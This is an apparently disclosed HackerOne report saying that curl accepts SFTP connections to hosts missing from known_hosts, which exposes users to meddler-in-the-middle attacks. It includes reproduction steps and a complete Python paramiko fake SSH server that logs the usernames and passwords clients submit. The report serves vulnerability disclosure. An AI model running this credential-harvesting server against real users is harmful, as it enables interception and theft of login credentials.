# curl allows SSH connection even if host is not in known_hosts

## Report Details
- **Report ID**: 2961050
- **URL**: https://hackerone.com/reports/2961050
- **State**: Closed
- **Severity**: high
- **Submitted**: 2025-01-27T17:30:02.608Z
- **Disclosed**: 2025-02-05T21:41:40.866Z

## Reporter
- **Username**: nyymi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: curl

## Vulnerability Information
## Summary:
Curl does _not_ fail if the SSH host identity cannot be verified due to the host not being included in the `.ssh/known_hosts` file. This makes using curl to login into an previously unknown ssh host system vulnerable to meddler in the middle attacks. When using key based authentication it will allow a malicious host to spoof the real system, and either return tampered or otherwise malicious content on download, or capture the uploads. When using username + password authentication it will also leak the username and password to the attacker, and thus allow the attacker to connect to the intended target host. 

Curl does have `--insecure` option which is said to:

```
              For SFTP and SCP, this option makes curl skip the known_hosts
              verification.  known_hosts is a file normally stored in the
              user's home directory in the ".ssh" subdirectory, which contains
              hostnames and their public keys.
```
From this it would be easy to assume that omitting `--insecure` would mean that the connection is secure, that is: the connection would fail if the host identity can't be verified *or* curl would prompt the user to verify the host key similar to how SSH command does. However, this is not the case, and the connection will succeed if the host is not in the `.ssh/known_hosts` file. The current curl behaviour is similar to ssh being used with `StrictHostKeyChecking` `accept-new`.

Note that while curl does warn of the issue with `Warning: Couldn't find a known_hosts file` this is too late:

```
$ curl --user foo sftp://localhost:2222
Enter host password for user 'foo':
Warning: Couldn't find a known_hosts file
curl: (67) Login denied
```
The warning is issued only after the password has been requested. The username & password have already been sent to the malicious server by the time the user sees the warning:
```
INFO:root:[pass] Authenticated username foo password bar
```
The warning also is quite useless when curl is being called from scripts as the command is not failing.

## Affected version
8.11.1

## Steps To Reproduce:
  1. `./configure --with-openssl --with-libssh` (or `--with-libssh2`)
  2. `make`
  3. Have no entry of targethost in `.ssh/known_hosts`file.
  4. `(DY)LD_LIBRARY_PATH=lib/.libs src/curl  sftp://foo:bar@targethost`

The middler in the middle will obtain the credentials:
```
INFO:root:[pass] Authenticated username foo password bar
```

## Supporting Material/References:

Here's a minimal fake SSH server dumping username & password sent to it. The server runs on port 2222.
```
#!/usr/bin/env python3

import paramiko.rsakey
import paramiko
import threading
import logging
import socket

logging.basicConfig(level = logging.INFO)

class SSHServer(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def get_allowed_auths(self, username):
        logging.debug('[auth] Get username {} allowed auths'.format(username))
        return "password,publickey,none"

    def check_auth_none(self, username):
        logging.debug('[none] Authenticated username {}'.format(username))
        return paramiko.AUTH_FAILED

    def check_auth_password(self, username, password):
        logging.info('[pass] Authenticated username {} password {}'.format(username, password))
        return paramiko.AUTH_FAILED

class ClientConnection(threading.Thread):
    def __init__(self, group = None, target = None, name = None, args = ()):
        threading.Thread.__init__(self, group = group, target = target, name = name)
        self.args = args

    def run(self):
        hostkey = self.args[0]
        client = self.args[1]
        transport = None
        chan = None

        try:
            transport = paramiko.Transport(client)
            try:
                transport.load_server_moduli()
            except:
                pass

            transport.add_server_key(hostkey)
            server = SSHServer()
            try:
                transport.start_server(server=server)
            except:
                logging.warning('*** SSH negotiation failed, disconnect')
                client.close()
                return

            logging.info('Full remote version: {}'.format(transport.remote_version))

            chan = transport.accept(10)
            if chan:
                chan.close()
            transport.close()

        except Exception as e:
            logging.info('*** Caught exception: {}: {}'.format(str(e.__class__), str(e)))
            if chan:
                chan.close()
            if transport:
                transport.close()
            pass


def main():
    hostkey = paramiko.rsakey.RSAKey.generate(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('', 2222))
    sock.listen(7)

    while True:
        client, addr = sock.accept()
        logging.info('Received connection from {}:{}'.format(addr[0], addr[1]))
        t = ClientConnection(args = (hostkey, client,))
        t.start()

if __name__ == '__main__':
    main()
```

  * [attachment / reference]

## Impact

## Summary:
- Download of malicious content (on download).
- Leak of confidential information (on upload).
- Leak of credentials (if using password auth).

## Attachments
No attachments
